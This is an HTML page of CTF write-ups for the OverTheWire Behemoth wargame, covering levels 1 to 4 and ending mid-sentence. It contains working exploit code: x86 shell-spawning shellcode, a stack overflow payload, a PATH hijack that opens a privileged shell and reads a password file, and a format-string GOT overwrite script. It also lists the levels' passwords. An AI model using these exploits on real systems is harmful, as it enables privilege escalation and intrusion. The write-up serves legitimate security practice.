@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=6aacf4c090fc5e966ec687925a0bf39a46c3a14c">
+    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Behemoth Writeups | Avishai’s CTF Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Behemoth Writeups" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="…" />
+<meta property="og:description" content="…" />
+<link rel="canonical" href="http://localhost:4000/CTF_writeups/overthewire/behemoth/" />
+<meta property="og:url" content="http://localhost:4000/CTF_writeups/overthewire/behemoth/" />
+<meta property="og:site_name" content="Avishai’s CTF Writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Behemoth Writeups" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"Behemoth Writeups","url":"http://localhost:4000/CTF_writeups/overthewire/behemoth/"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/CTF_writeups/">
+          <h1>Avishai's CTF Writeups</h1>
+        </a>
+        <h2>...</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <p>This folder contains solutions for the <a href="http://overthewire.org/wargames/behemoth/">Behemoth</a> wargame from OverTheWire.</p>
+
+<style>
+  body {
+    font-family: 'Arial', sans-serif;
+    background-color: #eceff1; /* Light gray background for softer look */
+    color: #333;
+    margin: 0;
+  }
+
+  #main {
+    max-width: 100% !important;
+    width: 100% !important;
+    margin: 0 auto;
+  }
+
+  .behemoth-container {
+    display: flex;
+    gap: 1.5rem;
+    margin-top: 2rem;
+    padding: 1rem;
+  }
+
+  /* Sidebar */
+  .behemoth-sidebar {
+    min-width: 200px;
+    max-height: 90vh;
+    overflow-y: auto;
+    position: sticky;
+    top: 1rem;
+    padding: 1.5rem;
+    border-radius: 8px;
+    background-color: #34495e; /* Slightly darker for more contrast */
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    color: #ecf0f1;
+    margin-top: 1rem;
+  }
+
+  .behemoth-sidebar h00 {
+    font-size: 1.2rem;
+    font-weight: 600;
+    margin-bottom: 1.5rem;
+    color: #ecf0f1;
+    border-bottom: 2px solid #16a085; /* Greenish accent */
+    padding-bottom: 0.5rem;
+  }
+
+  .behemoth-sidebar ul {
+    list-style: none;
+    padding-left: 0;
+    font-size: 1rem;
+    margin: 0;
+  }
+
+  .behemoth-sidebar li {
+    margin-bottom: 0.5rem;
+  }
+
+  .behemoth-sidebar a {
+    display: block;
+    padding: 6px 12px;
+    border-radius: 6px;
+    text-decoration: none;
+    color: #ecf0f1;
+    transition: background 0.3s ease, color 0.3s ease;
+  }
+
+  .behemoth-sidebar a:hover {
+    background-color: #16a085;
+    color: #fff;
+  }
+
+  .behemoth-content {
+    flex: 1;
+    max-height: 90vh;
+    overflow-y: auto;
+    padding-right: 1rem;
+    background-color: #ffffff; /* Off-white to reduce contrast */
+    border-radius: 8px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+    padding: 2rem;
+    font-size: 1rem;
+    color: #333;
+    margin-top: 1rem;
+  }
+
+  .behemoth-content h00 {
+    font-size: 1.4rem;
+    font-weight: 600;
+    margin-top: 2rem;
+    color: #2c3e50;
+    scroll-margin-top: 100px;
+  }
+
+  hr {
+    margin: 2.5rem 0;
+    border: none;
+    border-top: 1px solid #ddd;
+  }
+
+  /* Optional scrollbar styling */
+  .behemoth-sidebar::-webkit-scrollbar {
+    width: 8px;
+  }
+
+  .behemoth-sidebar::-webkit-scrollbar-thumb {
+    background-color: #16a085;
+    border-radius: 4px;
+  }
+
+  .behemoth-sidebar::-webkit-scrollbar-track {
+    background-color: #ecf0f1;
+  }
+
+  /* Responsive Design */
+  @media (max-width: 768px) {
+    .behemoth-container {
+      flex-direction: column;
+    }
+
+    .behemoth-sidebar {
+      max-height: auto;
+      width: 100%;
+      margin-bottom: 2rem;
+    }
+  }
+
+  /* Add a banner section after each level */
+  .level-banner {
+    background-color: #16a085;
+    color: #fff;
+    padding: 1rem;
+    text-align: center;
+    font-weight: bold;
+    margin-top: 2rem;
+    border-radius: 8px;
+  }
+</style>
+
+<div class="behemoth-container">
+
+  <!-- Sidebar -->
+  <div class="behemoth-sidebar">
+    <h00>Levels</h00>
+    <ul>
+      
+      
+      
+        
+        
+          <li><a href="#behemoth01">behemoth01</a></li>
+        
+      
+        
+        
+          <li><a href="#behemoth02">behemoth02</a></li>
+        
+      
+        
+        
+          <li><a href="#behemoth03">behemoth03</a></li>
+        
+      
+        
+        
+          <li><a href="#behemoth04">behemoth04</a></li>
+        
+      
+        
+        
+          <li><a href="#behemoth05">behemoth05</a></li>
+        
+      
+        
+        
+          <li><a href="#behemoth06">behemoth06</a></li>
+        
+      
+        
+        
+          <li><a href="#behemoth07">behemoth07</a></li>
+        
+      
+        
+        
+          <li><a href="#behemoth08">behemoth08</a></li>
+        
+      
+        
+        
+      
+    </ul>
+  </div>
+
+  <!-- Main content -->
+  <div class="behemoth-content">
+    
+      
+      
+        <h00 id="behemoth01">behemoth01</h00>
+        <p>the code can be found here</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">PATH</span> <span class="o">=</span> <span class="s">'/behemoth/behemoth0'</span>
+<span class="n">password</span> <span class="o">=</span> <span class="s">"eatmyshorts"</span>
+
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">PATH</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">password</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<p>here we reversed the file, and saw the password is <code class="language-plaintext highlighter-rouge">eatmyshorts</code></p>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">8YpAQCAuKf</code></em></strong></p>
+
+        
+        <!-- Level Banner (added for separation between levels) -->
+        <div class="level-banner">Next Level Writeup</div>
+
+        <hr />
+      
+    
+      
+      
+        <h00 id="behemoth02">behemoth02</h00>
+        <p>first we can see the challenge is based on buffer overflow, because the binary uses get.</p>
+
+<p>let’s use our script to find what is the position of the ret-address… we’ve found it’s 71.
+then, we will generate shellcode.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">NOP_SLIDE</span> <span class="o">=</span> <span class="mi">50</span>
+
+<span class="k">print</span> <span class="o">=</span> <span class="k">lambda</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">:</span> <span class="bp">None</span> <span class="c1"># override print function
+</span>
+
+<span class="c1"># setreuid(geteuid(), geteuid())
+# execv("/bin//sh", argv)
+</span>
+<span class="c1"># Shellcode in Python
+</span><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
+    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x31</span><span class="s">"</span>  <span class="c1"># push 0x31 (49)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (geteuid())
+</span>
+    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xc3</span><span class="s">"</span>  <span class="c1"># mov ebx, eax (uid)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xd9</span><span class="s">"</span>  <span class="c1"># mov ecx, ebx
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x46</span><span class="s">"</span>  <span class="c1"># push 0x46 (70)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80, setreuid(geteuid(), geteuid())
+</span>
+    <span class="sa">b</span><span class="s">"</span><span class="se">\x31\xd2</span><span class="s">"</span>  <span class="c1"># xor edx, edx
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x52</span><span class="s">"</span>      <span class="c1"># push edx, which is \0
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x68\x2f\x2f\x73\x68</span><span class="s">"</span>  <span class="c1"># push "//sh"
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x68\x2f\x62\x69\x6e</span><span class="s">"</span>  <span class="c1"># push "/bin"
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xe3</span><span class="s">"</span>  <span class="c1"># mov ebx, esp (now ebx contains: "/bin//sh",\x00)
+</span>
+    <span class="sa">b</span><span class="s">"</span><span class="se">\x52</span><span class="s">"</span>      <span class="c1"># push edx (push NULL into stack)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x53</span><span class="s">"</span>      <span class="c1"># push ebx (push pathname)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xe1</span><span class="s">"</span>  <span class="c1"># mov ecx, esp (ecx is argv)
+</span>
+    <span class="sa">b</span><span class="s">"</span><span class="se">\xb0\x0b</span><span class="s">"</span>  <span class="c1"># mov al, 0x0b (11)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (execv("/bin//sh", argv))
+</span>
+        <span class="c1"># mv eax, 1         ; system call number (sys_exit)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x01</span><span class="s">"</span>  <span class="c1"># push 1
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax (sys_exit)
+</span>    <span class="c1"># int 0x80
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (exit())
+</span><span class="p">)</span>
+
+<span class="c1"># Print shellcode details
+</span><span class="k">print</span><span class="p">(</span><span class="s">"Shellcode code is:"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"setreuid(geteuid(), geteuid())"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"execv(</span><span class="se">\"</span><span class="s">/bin//sh</span><span class="se">\"</span><span class="s">, argv)"</span><span class="p">)</span>
+
+<span class="c1"># Print shellcode with NOP slide
+</span><span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Shellcode as formatted string:"</span><span class="p">)</span>
+
+<span class="c1"># Add NOP slide (\x90) before shellcode
+</span><span class="n">nop_slide</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="n">NOP_SLIDE</span>
+<span class="n">formatted_shellcode</span> <span class="o">=</span> <span class="n">nop_slide</span> <span class="o">+</span> <span class="n">shellcode</span>
+
+<span class="c1"># Convert to formatted string
+</span><span class="n">formatted_string</span> <span class="o">=</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\\</span><span class="s">x</span><span class="si">{</span><span class="n">byte</span><span class="si">:</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="s">"</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">formatted_shellcode</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">formatted_string</span><span class="p">)</span>
+
+<span class="c1"># Print shellcode in hex format
+</span><span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Shellcode in hex format:"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">byte</span><span class="si">:</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="s">"</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">formatted_shellcode</span><span class="p">))</span>
+
+<span class="c1"># Calculate shellcode length
+</span><span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">Length of shellcode is </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">formatted_shellcode</span><span class="p">)</span><span class="si">}</span><span class="s"> bytes"</span><span class="p">)</span>
+
+<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">formatted_shellcode</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>now we will load the shellcode into env variable:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export SHELLCODE=$(echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x31\x58\xcd\x80\x89\xc3\x89\xd9\x6a\x46\x58\xcd\x80\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80")
+</code></pre></div></div>
+<p>we need to find the address of the env variable.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Usage: num of variable is %d, less than expected</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">argc</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"name of var is: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> 
+    <span class="n">printf</span><span class="p">(</span><span class="s">"address is %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">getenv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// this code can be used to get address of env_var, by this way you can override the ret-address</span>
+
+</code></pre></div></div>
+<p>notice to compile it with the <code class="language-plaintext highlighter-rouge">-m32</code> flag, for example: <code class="language-plaintext highlighter-rouge">gcc -m32 get_address.c -o get_address</code></p>
+
+<p>after finding the address of the env variable, in our case: <code class="language-plaintext highlighter-rouge">0xffffd511</code>, we need to insert it to the script that solves the challenge.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">PATH</span> <span class="o">=</span> <span class="s">'/behemoth/behemoth1'</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">1000</span><span class="p">))</span>  <span class="c1"># Generate a 100-byte cyclic pattern
+</span>
+<span class="c1"># crash_addr = 0x66616168
+# print(cyclic_find(crash_addr))
+# find after how many bytes the ret-address is found, in this case, 71.
+</span><span class="n">ret_addr_pos</span> <span class="o">=</span> <span class="mi">71</span>
+<span class="n">ret_addr</span> <span class="o">=</span> <span class="mh">0xffffd511</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">ret_addr_pos</span> <span class="o">*</span> <span class="sa">b</span><span class="s">'a'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">PATH</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+
+</code></pre></div></div>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">IxPJbQtH8q</code></em></strong></p>
+
+        
+        <!-- Level Banner (added for separation between levels) -->
+        <div class="level-banner">Next Level Writeup</div>
+
+        <hr />
+      
+    
+      
+      
+        <h00 id="behemoth03">behemoth03</h00>
+        <p>In this challenge, we can see the code call this line in C: <code class="language-plaintext highlighter-rouge">system("touch $pid")</code>, so, we’ll override the <code class="language-plaintext highlighter-rouge">touch</code> by manipulating the $PATH environment variable.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>behemoth2@gibson:/tmp/tmp.SzpOLaiNNy$ echo "/bin/bash" &gt; touch
+behemoth2@gibson:/tmp/tmp.SzpOLaiNNy$ export PATH=$(pwd):$PATH
+behemoth2@gibson:/tmp/tmp.SzpOLaiNNy$ chmod +x touch
+behemoth2@gibson:/tmp/tmp.SzpOLaiNNy$ chmod +x .
+behemoth2@gibson:/tmp/tmp.SzpOLaiNNy$ /behemoth/behemoth2
+behemoth3@gibson:/tmp/tmp.SzpOLaiNNy$ cat /etc/behemoth_pass/behemoth3
+JQ6tZGqt0i
+</code></pre></div></div>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">JQ6tZGqt0i</code></em></strong></p>
+
+        
+        <!-- Level Banner (added for separation between levels) -->
+        <div class="level-banner">Next Level Writeup</div>
+
+        <hr />
+      
+    
+      
+      
+        <h00 id="behemoth04">behemoth04</h00>
+        <p>first i created <code class="language-plaintext highlighter-rouge">profile.rr2</code> file and put the follow content in it:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>program=/behemoth/behemoth3
+stdin=input
+</code></pre></div></div>
+
+<p>then, i inserted the payload into the input file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 payload.py &gt; input
+</code></pre></div></div>
+
+<p>and then, when i want to debug with r2 and the given input, i can run this line:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r2 -e dbg.profile=profile.rr2
+</code></pre></div></div>
+<p>first, we can see that the binary doesn’t use ASLR, and also the relro is turned off.
+<img src="/CTF_writeups/overthewire/behemoth/images/level4_1.png" alt="alt text" /></p>
+
+<p>so, let’s try to use the format string attack to override the address of the puts function to our shellcode address.</p>
+
+<p>find the address to override:
+<img src="/CTF_writeups/overthewire/behemoth/images/level4_2.png" alt="alt text" />
+<img src="/CTF_writeups/overthewire/behemoth/images/level4_3.png" alt="alt text" />
+so, the address is: <code class="language-plaintext highlighter-rouge">0x0804b218</code>
+the address we want to insert is: <code class="language-plaintext highlighter-rouge">0xffffd53f</code> (same as last level, put shellcode on env, and find its address)</p>
+
+<p>the python script for creating the payload can is here: [level4.py]</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">address_of_puts</span> <span class="o">=</span> <span class="mh">0x0804b218</span>
+<span class="n">address_of_shellcode</span> <span class="o">=</span> <span class="mh">0xffffd510</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'JUNK'</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">address_of_puts</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'JUNK'</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">address_of_puts</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'JUNK'</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">address_of_puts</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'JUNK'</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">address_of_puts</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span>
+
+<span class="n">printed_chars</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">byte_to_insert</span> <span class="o">=</span> <span class="n">address_of_shellcode</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
+<span class="k">print</span><span class="p">(</span><span class="n">byte_to_insert</span><span class="p">)</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">byte_to_insert</span> <span class="o">-</span> <span class="n">printed_chars</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"res is:"</span><span class="p">,</span><span class="n">res</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">res</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">:</span>
+    <span class="k">while</span> <span class="n">res</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">:</span>
+        <span class="n">res</span> <span class="o">+=</span> <span class="mh">0x100</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'%'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span> <span class="sa">b</span><span class="s">'x'</span>  <span class="o">+</span> <span class="sa">b</span><span class="s">'%n'</span>
+    <span class="n">printed_chars</span> <span class="o">+=</span> <span class="n">res</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'%'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span> <span class="sa">b</span><span class="s">'x'</span>  <span class="o">+</span> <span class="sa">b</span><span class="s">'%n'</span>
+    <span class="n">printed_chars</span> <span class="o">+=</span> <span class="n">res</span> 
+
+
+<span class="n">byte_to_insert</span> <span class="o">=</span> <span class="p">(</span><span class="n">address_of_shellcode</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mh">0xff</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
+<span class="k">print</span><span class="p">(</span><span class="n">byte_to_insert</span><span class="p">)</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">byte_to_insert</span> <span class="o">-</span> <span class="n">printed_chars</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"res is:"</span><span class="p">,</span><span class="n">res</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">res</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">:</span>
+    <span class="k">while</span> <span class="n">res</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">:</span>
+        <span class="n">res</span> <span class="o">+=</span> <span class="mh">0x100</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'%'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span> <span class="sa">b</span><span class="s">'x'</span>  <span class="o">+</span> <span class="sa">b</span><span class="s">'%n'</span>
+    <span class="n">printed_chars</span> <span class="o">+=</span> <span class="n">res</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'%'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span> <span class="sa">b</span><span class="s">'x'</span>  <span class="o">+</span> <span class="sa">b</span><span class="s">'%n'</span>
+    <span class="n">printed_chars</span> <span class="o">+=</span> <span class="n">res</span>
+
+
+<span class="n">byte_to_insert</span> <span class="o">=</span> <span class="p">(</span><span class="n">address_of_shellcode</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mh">0xff</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span>
+<span class="k">print</span><span class="p">(</span><span class="n">byte_to_insert</span><span class="p">)</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">byte_to_insert</span> <span class="o">-</span> <span class="n">printed_chars</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"res is:"</span><span class="p">,</span><span class="n">res</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">res</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">:</span>
+    <span class="k">while</span> <span class="n">res</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">:</span>
+        <span class="n">res</span> <span class="o">+=</span> <span class="mh">0x100</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'%'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span> <span class="sa">b</span><span class="s">'x'</span>  <span class="o">+</span> <span class="sa">b</span><span class="s">'%n'</span>
+    <span class="n">printed_chars</span> <span class="o">+=</span> <span class="n">res</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'%'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span> <span class="sa">b</span><span class="s">'x'</span>  <span class="o">+</span> <span class="sa">b</span><span class="s">'%n'</span>
+    <span class="n">printed_chars</span> <span class="o">+=</span> <span class="n">res</span>
+
+
+<span class="n">byte_to_insert</span> <span class="o">=</span> <span class="p">(</span><span class="n">address_of_shellcode</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mh">0xff</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">)</span> <span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span>
+<span class="k">print</span><span class="p">(</span><span class="n">byte_to_insert</span><span class="p">)</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">byte_to_insert</span> <span class="o">-</span> <span class="n">printed_chars</span> 
+<span class="k">print</span><span class="p">(</span><span class="s">"res is:"</span><span class="p">,</span><span class="n">res</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">res</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">:</span>
+    <span class="k">while</span> <span class="n">res</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">:</span>
+        <span class="n">res</span> <span class="o">+=</span> <span class="mh">0x100</span>
+    <span class="c1"># payload += b'%' + str(res+4).encode()+ b'x'  + b'%n'
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'%'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span> <span class="sa">b</span><span class="s">'x'</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'%n'</span>
+    <span class="n">printed_chars</span> <span class="o">+=</span> <span class="n">res</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'%'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span> <span class="sa">b</span><span class="s">'x'</span>  <span class="o">+</span> <span class="sa">b</span><span class="s">'%n'</span>
+    <span class="n">printed_chars</span> <span class="o">+=</span> <span class="n">res</span>
+
+
+<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>after building the payload, all left is to run this:</p>
